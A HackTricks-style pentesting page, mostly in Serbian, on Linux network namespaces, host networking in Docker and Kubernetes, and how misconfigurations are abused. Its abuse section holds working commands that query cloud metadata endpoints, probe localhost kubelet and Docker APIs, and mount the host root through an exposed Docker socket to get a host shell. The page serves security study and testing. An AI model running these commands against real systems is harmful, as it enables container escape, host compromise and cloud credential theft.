# Mrežni namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mrežni namespace izoluje mrežne resurse kao što su interfejsi, IP adrese, tabele rutiranja, ARP/neighbor stanje, firewall pravila, sockets, i sadržaj fajlova kao što je `/proc/net`. Zato kontejner može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj bez posedovanja stvarnog mrežnog stack-a hosta.

Sa bezbednosnog aspekta, ovo je važno jer mrežna izolacija podrazumeva mnogo više od vezivanja portova. Privatni mrežni namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, kontejner može iznenada dobiti vidljivost nad host listeners, host-local services i mrežnim kontrolnim tačkama koje nikada nisu trebale biti izložene aplikaciji.

## Rad

Novo kreirani mrežni namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem dok mu se ne prikače interfejsi. Container runtimes zatim kreiraju ili povezuju virtuelne interfejse, dodeljuju adrese i konfigurišu rute tako da workload ima očekivanu povezanost. U bridge-based deployments, to obično znači da kontejner vidi veth-backed interface povezan na host bridge. U Kubernetes, CNI plugins obavljaju ekvivalentnu konfiguraciju za Pod networking.

Ova arhitektura objašnjava zašto je `--network=host` ili `hostNetwork: true` tako dramatična promena. Umesto da dobije pripremljen privatni mrežni stack, workload se pridružuje stvarnom onom na hostu.

## Lab

Možete videti skoro prazan mrežni namespace sa:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Možete uporediti normalne i host-networked kontejnere sa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Runtime Usage

Docker i Podman obično kreiraju privatni network namespace za svaki container osim ako nije drugačije konfigurisano. Kubernetes obično dodeljuje svakom Pod‑u sopstveni network namespace, koji dele containeri unutar tog Pod‑a ali je odvojen od host‑a. Incus/LXC sistemi takođe pružaju bogatu izolaciju zasnovanu na network namespace‑ima, često sa raznovrsnijim virtuelnim mrežnim podešavanjima.

Uobičajeni princip je da je privatno umrežavanje podrazumevana granica izolacije, dok je host networking eksplicitno isključivanje iz te granice.

## Misconfigurations

Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace‑a. To se ponekad radi radi performansi, niskonivo nadzora ili pogodnosti, ali time se uklanja jedna od najčistijih granica dostupnih containerima. Host-local listeners postaju dostupni na direktniji način, localhost-only servisi mogu postati pristupačni, a capabilities poput `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na mrežno okruženje samog host‑a.

Još jedan problem je prekomerno dodeljivanje mrežno-povezanih capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw sockets ili naprednu kontrolu mreže bezopasnim.

## Abuse

U slabo izolovanim okruženjima, napadači mogu pregledati host listening servise, dohvatiti management endpoint‑e vezane samo za loopback, prisluškivati ili ometati saobraćaj u zavisnosti od konkretnih capabilities i okruženja, ili rekonfigurisati routing i stanje firewall‑a ako je prisutan `CAP_NET_ADMIN`. U klasteru, ovo takođe može olakšati lateral movement i control‑plane reconnaissance.

Ako sumnjate na host networking, počnite potvrđivanjem da vidljivi interfejsi i listeners pripadaju host‑u, a ne izolovanoj container mreži:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only servisi često su prvo zanimljivo otkriće:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ako su prisutne mrežne mogućnosti, testirajte da li workload može da pregleda ili izmeni vidljivi stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
U cluster ili cloud okruženjima, host networking takođe opravdava brzu lokalnu recon metadata i control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Potpun primer: Host Networking + Local Runtime / Kubelet Access

Host networking ne pruža automatski host root, ali često izlaže servise koji su namerno dostupni samo iz samog čvora. Ako je jedan od tih servisa slabo zaštićen, host networking postaje direktan privilege-escalation put.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Uticaj:

- direktno kompromitovanje hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
- izviđanje klastera ili lateral movement ako su kubelet ili lokalni agenti dostupni
- manipulacija saobraćajem ili denial of service kada se kombinuje sa `CAP_NET_ADMIN`

## Provere

Cilj ovih provera je da utvrdite da li proces ima privatni mrežni stek, koje rute i koji listeneri su vidljivi, i da li mrežni prikaz već izgleda sličan hostu pre nego što uopšte testirate capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Zanimljivo ovde:

- Ako identifikator namespace-a ili vidljivi skup interfejsa liči na host, host networking možda već jeste u upotrebi.
- `ss -lntup` je posebno vredan jer otkriva slušače koji su dostupni samo na loopback interfejsu i lokalne upravljačke krajnje tačke.
- Rute, imena interfejsa i kontekst firewalla postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN` ili `CAP_NET_RAW`.

Prilikom pregleda containera, uvek procenjujte network namespace zajedno sa capability set-om. Host networking uz jake network capabilities predstavlja sasvim drugačiju postavku od bridge networking uz usko ograničen default capability set.
{{#include ../../../../../banners/hacktricks-training.md}}
